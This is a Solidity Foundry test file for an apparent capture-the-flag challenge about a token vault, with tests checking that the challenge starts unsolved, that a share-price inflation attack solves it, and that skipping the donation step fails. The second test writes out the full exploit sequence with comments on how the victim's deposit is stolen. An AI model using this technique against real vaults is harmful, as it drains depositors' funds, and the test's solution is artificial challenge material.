// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {VaultFactory} from "../src/VaultFactory.sol";
import {Setup} from "../src/Setup.sol";
import {Vault} from "../src/Vault.sol";
import {Depositor} from "../src/Depositor.sol";
import {MockERC20} from "@infra/MockERC20.sol";

contract VaultInflationTest is Test {
    VaultFactory factory;
    address player = makeAddr("player");
    Setup setup;
    MockERC20 asset;
    Vault vault;
    Depositor depositor;

    function setUp() public {
        factory = new VaultFactory();
        vm.prank(player);
        setup = factory.spawn();
        asset = setup.asset();
        vault = setup.vault();
        depositor = setup.depositor();
    }

    function test_FreshSetupIsUnsolved() public {
        assertFalse(factory.isSolved(player));
        assertFalse(factory.isSolved(makeAddr("rando")));
    }

    function test_InflationAttackSolves() public {
        vm.startPrank(player);

        // 1. Approve vault to spend our USDC.
        asset.approve(address(vault), type(uint256).max);

        // 2. Deposit 1 wei → mint 1 share at share price 1 wei.
        vault.deposit(1);
        assertEq(vault.balanceOf(player), 1, "should have 1 share");

        // 3. Donate enough to inflate the share price ABOVE the victim's
        //    deposit, so floor(victimDeposit * totalShares / totalAssets) == 0.
        asset.transfer(address(vault), 1_001 ether);

        // 4. Trigger the victim. Their 1000 ether goes in, their share
        //    mint floors to 0, the assets become ours.
        vm.stopPrank();
        depositor.triggerVictimDeposit();

        // 5. Withdraw our 1 share, sweep the vault.
        vm.prank(player);
        vault.withdraw(1);

        assertTrue(factory.isSolved(player), "isSolved should be true");
        assertGe(asset.balanceOf(player), setup.SOLVE_THRESHOLD());
        assertEq(vault.balanceOf(address(depositor)), 0, "victim must have 0 shares");
    }

    function test_OrderMatters_NoDonation_DoesNotSolve() public {
        vm.startPrank(player);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(1);
        vm.stopPrank();

        depositor.triggerVictimDeposit();

        vm.prank(player);
        vault.withdraw(1);

        // Without inflation, we just get our 1 wei back; can't pass threshold.
        assertFalse(factory.isSolved(player), "must NOT solve without donation");
    }
}
